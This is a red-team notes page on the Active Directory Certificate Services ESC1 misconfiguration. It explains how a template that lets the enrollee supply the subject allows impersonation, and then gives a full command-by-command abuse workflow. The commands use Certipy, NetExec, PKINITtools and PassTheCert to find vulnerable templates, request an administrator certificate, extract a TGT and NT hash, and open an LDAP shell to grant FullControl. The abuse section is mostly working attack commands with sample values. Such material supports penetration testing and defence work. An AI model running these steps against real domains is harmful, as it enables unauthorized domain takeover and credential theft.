---
Primary_category: "[[ADCS]]"
title: "ADCS - ESC1"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[ADCS]]

#### *Theory*

This type of *ADCS* misconfiguration can lead to privilege escalatation, and thus, compromise of the entire domain in an *AD* environment

It arises when an existing certificate template in the *CA* is not propertly secured, allowing a low-privileged user to request a certificate and ***specify an arbitraty identity within the Certificate's Subject Alternative Name ( SAN )***

Therefore, it allows the attacker to impersonate any user account in the domain, including privileged accounts such as administrators

A template vulnerable to *ESC1* typically has the following features →

- **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** ***enabled***

This option allows the person requesting the certificate to define the *SAN* as desired. So the client can specify another entity in the *Certificate Signing Request ( CSR )* and dictates the certificate entity

- ***Authentication EKU***

Such as *Client Authentication*, *Smart Card Logon* or *Any Purpose*

- ***Permissive Enrollment Rights***

Generic domain groups such as *Domain Users*, *Domain Computers* or *Authenticated Users* can enroll in the given template

- ***Automated Request Processing***

It does not requires any administrator to accept incoming certificate requests related to the template in question

---

#### *Enumeration*

##### *Certipy*

> ***[Certipy](https://github.com/ly4k/Certipy)***

```bash
certipy find -dc-ip '<DC_IP>' -username '<USER>' -password '<PASSWD>' -stdout -vulnerable
```

---

#### *Abuse*

##### *Workflow*

First, we must check if *ADCS* is present in the given *AD* environment, which can be gathered through *LDAP*

Then, we have to enumerate all the existing certificate templates in the *CA* looking for any security flaw or misconfiguration

Once we have identified one or several misconfigurations related to *ESC1*, which were discussed previously, and requirements below are met, we can takeover the entire domain

It's as simple as submitting a *CSR* to the *CA* that has an arbitrary entity as its *SAN*, such as the domain administrator account or *SID* and applying to the misconfigured template

With the issued certificate, we can carry out several actions →

- ***PKINIT → [[PASS THE CERTIFICATE|Pass the Certificate]] → TGT → [[UNPAC THE HASH|Unpac the Hash]] → NT Hash***

- ***No PKINIT → [[PASS THE CERTIFICATE (SCHANNEL)|Schannel Pass the Certificate]] → LDAP Authentication***

##### *Requirements*

- ***Valid Domain Credentials***

- ***The compromised principal has enrollment rights over the vulnerable template***

- ***Vulnerable Template → `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled***

- ***Vulnerable Template → Valid Authentication EKU***

> ***e.g. Client Authentication or Smart Card Logon***

##### *UNIX-Like*

###### *Identifying ADCS in the domain*

- ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc ldap '<DC>' --username '<USER>' --password '<PASSWD' --module adcs
```

> [!DANGER]- *e.g.*
>
> ```bash
> nxc ldap 10.10.10.5 --username 'john.doe' --password 'password1234$!' --module adcs
> ```
>

###### *Looking for security flaws and misconfigurations in ADCS*

- ***[Certipy](https://github.com/ly4k/Certipy)***

***Setup***

```bash
mkdir Certipy
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install certipy-ad
```

***Usage***

```bash
certipy find -dc-ip '<DC_IP>' -username '<USER>' -password '<PASSWD>' -stdout -vulnerable
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy find -dc-ip '10.10.10.5' -username 'john.doe' -password 'password1234$!' -stdout -vulnerable
> ```
>

###### *Requesting a certificate for the template vulnerable to ESC1*

- ***Certipy***

```bash
certipy req -dc-ip '<DC_IP>' -u '<USER>@<DOMAIN>' -p '<PASSWD>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>' -upn '<IMPERSONATED_PRINCIPAL>@<DOMAIN>' -sid '<IMPERSONATED_USER_SID>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy req -dc-ip '10.10.10.5' -u 'john.doe@DOMAIN.INTERNAL' -p 'password1234$!' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-CA' -template 'SampleTemplate' -upn 'administrator@DOMAIN.INTERNAL' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
> ```
>

###### *#1 - PKINIT PtC + Unpac the Hash*

- ***Certipy***

```bash
certipy auth -dc-ip '<DC_IP>' -pfx '<PFX>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy auth -dc-ip '10.10.10.5' -pfx administrator.pfx
> ```
>

- ***[PKINITtools](https://github.com/dirkjanm/PKINITtools)***

***Setup***

```bash
git clone 'https://github.com/dirkjanm/PKINITtools' PKINITtools
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install -r requirements.txt
```

***Usage***

> ***[[PASS THE CERTIFICATE|PtC]]***

```bash
python3 gettgtpkinit.py -dc-ip '<DC_IP>' -cert-pfx '<PFX>' '<DOMAIN>/<PRINCIPAL>' '<CCACHE_FILE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 gettgtpkinit.py -dc-ip '10.10.10.5' -cert-pfx administrator.pfx 'DOMAIN.INTERNAL/administrator' 'administrator.ccache'
> ```
>

> ***[[UNPAC THE HASH|UtH]]***

```bash
export KRB5CCNAME=$( realpath <CACHE_FILE> )
```

```bash
python3 getnthash.py -dc-ip '<DC_IP>' -key '<AS_REP_ENC_KEY>' '<DOMAIN>/<USER>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 getnthash.py -dc-ip '10.10.10.5' -key '4a917980d21d1cdb32f83099fb0d119f4b5c75c20bf5d0f4f5441c1c88a290d2' 'DOMAIN.INTERNAL/administrator'
> ```
>

###### *#2 - Schannel PtC*

> ***See [[PASS THE CERTIFICATE (SCHANNEL)|PtC with Schannel]]***

If the *DC* in question does not support *PKINIT* due to the absence of the *Smart Card Logon Extended Key Usage ( EKU )* in its certificate, an operator could use the issued certificate to authenticate against *LDAPs* or *LDAP* with *STARTTLS*

Then, we could carry out specific actions depending on the privileges the principal in question has over the domain

For instance, if we leverage an *ESC1* vector to obtain an arbitraty certificate whose *SAN* corresponds to the identity of a privileged domain user, such as the administrator account, we could grant ourselves *FullControl* over the latter

- ***Certipy***

```bash
certipy auth -dc-ip '<DC_IP>' -pfx '<PFX>' -ldap-shell
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy auth -dc-ip '10.10.10.5' -pfx 'administrator.pfx' -ldap-shell
> ```
>

> ***Certipy's LDAP Shell***

```bash
> grant_control 'DC=<DOMAIN>,DC=<TLD>' '<TARGET_PRINCIPAL>' '<GRANTEE>' # i.e. A controlled domain account
```

> [!DANGER]- *e.g.*
>
> ```bash
> grant_control 'DC=DOMAIN,DC=INTERNAL' 'administrator' 'john.doe'
> ```

- ***[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)***

***Setup***

> ***Downloading the script***

```bash
curl --silent --location --request GET --remote-name 'https://github.com/AlmondOffSec/PassTheCert/raw/refs/heads/main/Python/passthecert.py'
```

> ***Extracting both certificate and private key from the PFX***

```bash
certipy cert -pfx '<PFX>' -nokey -out '<OUTPUT_CERTIFICATE>'
certipy cert -pfx '<PFX>' -nocert -out '<OUTPUT_PRIVATE_KEY>'
# Or
openssl pkcs12 -in '<PFX>' -clcerts -nokeys -out '<OUTPUT_CERTIFICATE>'
openssl pkcs12 -in '<PFX>' -nocerts -out '<OUTPUT_PRIVATE_KEY>'
```

***Usage***

```bash
python3 passthecert.py -action 'ldap-shell' -domain '<DOMAIN>' -dc-host '<DC_FQDN>' -crt '<CERTIFICATE>' -key '<PRIVATE_KEY>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 passthecert.py -action 'ldap-shell' -domain 'DOMAIN.INTERNAL' -dc-host 'DC01.DOMAIN.INTERNAL' -crt user.crt -key user.key
> ```
>

##### *Windows*

> 🛠️⌛

---

#### *Resources*

***[Certipy Wiki: ESC1](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)***

***[BlackHills Infosec: Abusing ADCS - Part I](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)***

***[SpecterOps](https://specterops.io/blog/2022/11/09/certificates-and-pwnage-and-patches-oh-my/)***